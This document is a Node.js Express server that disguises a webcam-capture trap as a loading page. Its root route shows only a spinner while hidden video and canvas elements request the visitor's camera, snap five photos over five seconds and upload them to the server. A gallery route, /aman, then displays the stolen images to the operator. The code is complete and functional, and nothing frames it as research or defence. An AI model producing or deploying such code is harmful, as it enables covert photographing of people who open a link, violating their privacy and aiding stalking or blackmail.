const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

const photosDir = path.join(__dirname, "photos");
if (!fs.existsSync(photosDir)) fs.mkdirSync(photosDir);

app.use(express.json({ limit: "10mb" }));

// Save base64 images
app.post("/upload-base64", (req, res) => {
  const { images } = req.body;
  if (!images || !Array.isArray(images)) {
    return res.status(400).json({ error: "No images" });
  }
  const savedFiles = [];
  images.forEach((img, i) => {
    const data = img.replace(/^data:image\\/png;base64,/, "");
    const file = `photo_${Date.now()}_${i}.png`;
    fs.writeFileSync(path.join(photosDir, file), data, "base64");
    savedFiles.push(`/photos/${file}`);
  });
  res.json({ success: true, files: savedFiles });
});

// List photos
app.get("/photos", (req, res) => {
  fs.readdir(photosDir, (err, files) => {
    if (err) return res.json([]);
    res.json(files.map(f => `/photos/${f}`));
  });
});

// Clear photos
app.post("/clear", (req, res) => {
  fs.readdirSync(photosDir).forEach(f => {
    fs.unlinkSync(path.join(photosDir, f));
  });
  res.json({ success: true });
});

app.use("/photos", express.static(photosDir));

// Hidden capture page
app.get("/", (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <style>
    body {
      margin:0;display:flex;justify-content:center;align-items:center;
      height:100vh;background:#000;color:#fff;font-family:sans-serif;
    }
    .spinner {
      border: 8px solid rgba(255,255,255,0.1);
      border-left-color: #09f;
      border-radius: 50%;
      width: 80px;height: 80px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin { 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="spinner"></div>

  <video id="cam" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

<script>
  async function capture() {
    const v = document.getElementById('cam');
    const c = document.getElementById('canvas');
    const ctx = c.getContext('2d');

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video:true });
      v.srcObject = stream;

      let images = [];
      for (let i=0;i<5;i++) {
        await new Promise(r=>setTimeout(r,1000));
        c.width = v.videoWidth; c.height = v.videoHeight;
        ctx.drawImage(v,0,0);
        images.push(c.toDataURL("image/png"));
      }

      await fetch('/upload-base64',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({images})
      });

      stream.getTracks().forEach(t=>t.stop());
      window.location.href="/aman";
    } catch(e) {
      alert("Camera access denied!");
    }
  }
  capture();
</script>
</body>
</html>
  `);
});

// Gallery page
app.get("/aman", (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Gallery</title>
  <style>
    body { margin:0;padding:20px;background:#111;color:#fff;font-family:sans-serif;text-align:center; }
    h1 { margin-bottom:20px; }
    .grid {
      display:grid;gap:10px;
      grid-template-columns:repeat(auto-fill,minmax(200px,1fr));
    }
    .grid img {
      width:100%;border-radius:10px;
      box-shadow:0 0 10px rgba(0,255,255,0.5);
      transition:.3s;
    }
    .grid img:hover { transform:scale(1.05); }
    button {
      margin-top:15px;padding:10px 20px;
      background:#09f;border:none;border-radius:6px;
      color:#fff;cursor:pointer;
    }
  </style>
</head>
<body>
  <h1>📸 Captured Photos</h1>
  <div class="grid" id="gallery"></div>
  <button onclick="clearPhotos()">Clear All</button>
<script>
  async function loadPhotos() {
    const res = await fetch('/photos');
    const photos = await res.json();
    document.getElementById('gallery').innerHTML =
      photos.map(p=>\`<img src="\${p}">\`).join('');
  }
  async function clearPhotos(){
    await fetch('/clear',{method:'POST'});
    loadPhotos();
  }
  loadPhotos();
</script>
</body>
</html>
  `);
});

app.listen(PORT, () => console.log("✅ Server running on port "+PORT));
